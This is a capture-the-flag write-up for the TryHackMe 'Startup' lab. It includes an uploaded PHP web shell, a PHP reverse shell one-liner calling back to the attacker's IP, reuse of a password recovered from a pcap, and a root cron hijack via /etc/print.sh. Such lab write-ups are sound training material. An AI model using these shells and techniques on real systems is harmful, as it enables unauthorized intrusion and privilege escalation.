# Startup
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* FTP Restricted Upload
* Reverse Shell
* Hidden cronjob

Tools used
--
* nmap
* ffuf
* ftp
* wireshark
* pspy

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.200.139
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.200.139 -p- -T5 -vvv

<SNIP>
Discovered open port 21/tcp on 10.10.200.139
Discovered open port 80/tcp on 10.10.200.139
Discovered open port 22/tcp on 10.10.200.139
<SNIP>
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
<SNIP>
```
Phase 2: Foothold
--
Let's retrieve files from ftp by anonymous login:
```
ftp -n 10.10.200.139

Connected to 10.10.200.139.
220 (vsFTPd 3.0.3)
ftp> user anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
```
Get these two files. Note that in general, you could not see any hidden files starting with `.`. By opening the JPG image, it is possible to note a small string on the character, like `Adityaaa.xd`. In the `notice.txt` file is reported:
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```
After spending a lot of time by cracking `maya` or `aditya` usernames with no luck, from the Nmap result, we see that `ftp` folder is writable, while the ftp root folder is not. Let's try to upload a web shell on `ftp` folder. Our `shell.php`:
```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```
Let's connect to ftp:
```
ftp -n 10.10.200.139

Connected to 10.10.200.139.
220 (vsFTPd 3.0.3)
ftp> user anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp> cd ftp
250 Directory successfully changed.
ftp> put shell.php
```
Now visit: http://10.10.200.139/files/ftp/shell.php

If you wish, you can also use a reverse shell. Since I tried to upload some PHP shells but they didn't execute, I use web shell for running a reverse shell.

Now you can send commands to the web server:
```
php -r '$sock=fsockopen("10.18.98.39",4444);exec("/bin/sh <&3 >&3 2>&3");'
```
and click `Execute`. Remember to run netcat listener on port 4444.

On netcat listener, run:
```
script /dev/null -c bash
ls -la /home

drwx------  4 lennie lennie 4096 Nov 12  2020 lennie

ls -la /
<SNIP>
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
<SNIP>
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
<SNIP>
```
So, we know that a user of this server is `lennie`. Furthermore, inside `incidents` folder there is a `suspicious.pcapng` file. For our challenge, by the way, we can retrieve the secret recipe by `cat /recipe.txt`.

Let's copy `suspicious.pcapng` file to `ftp` folder so we can retrieve it on the attacker machine and analyze it:
```
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
```
By the browser, go to http://10.10.200.139/files/ftp/suspicious.pcapng and get the file. Open it by Wireshark and analyze it. Go on Analyze -> Follow -> TCP Stream and you can read some useful information that show an attack attempt.

On one of these TCP streams, we can read:
```
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: c4ntg3t3n0ughsp1c3

sudo: 3 incorrect password attempts
```
Come back to the reverse shell, and use this password for `lennie` user:
```
su lennie
<c4ntg3t3n0ughsp1c3>
```
It worked! Now we can get the user flag inside the lennie home directory. For being more comfortable with the shell, let's connect by SSH with lennie password.

Phase 3: Privilege Escalation
--
Inside lennie home directory, there is a `scripts` and `Documents` folders. Let's give a look for an interesting information. In particular, we can see `planner.sh`:
```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
and `startup_list.txt` that is empty. Let's give a look to `/etc/print.sh`:
```
#!/bin/bash
echo "Done!"
```
Furthermore, by looking the permissions on this file, we get:
```
ls -la /etc/print.sh 
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```
In this situation, we could edit this file for putting anything we wish. At this point, we could think that `planner.sh` could be run as a scheduled task. By looking on crontab, we don't anything.

By searching on Internet, we notice that there could be hidden cronjob that we can discover by the usage of [pspy](https://github.com/DominicBreuker/pspy). This tool monitors the execution of processes on Linux in runtime. Let's download `pspy64` and move it to the target machine:
```
scp pspy64 lennie@10.10.182.57:/home/lennie/
```
Come back to the target machine and run `pspy`:
```
chmod +x pspy64
./pspy64

<SNIP>
2022/08/27 13:19:01 CMD: UID=0    PID=1522   | /bin/bash /home/lennie/scripts/planner.sh 
2022/08/27 13:19:01 CMD: UID=0    PID=1521   | /bin/sh -c /home/lennie/scripts/planner.sh
<SNIP>
```
`UID=0` should mean that the process is run as `root`.

Summarizing, we need only to edit `/etc/print.sh` file with the commands we wish. This file will be called as root by `planner.sh` script. Let's edit `/etc/print.sh` in the following manner:
```bash
#!/bin/bash
cp -rf /root/root.txt /home/lennie/
chmod +r /home/lennie/root.txt
echo "Done!"
```
We can monitor this process by `pspy` tool or we can simply wait until `root.txt` will appear on lennie home folder, and we get the root flag.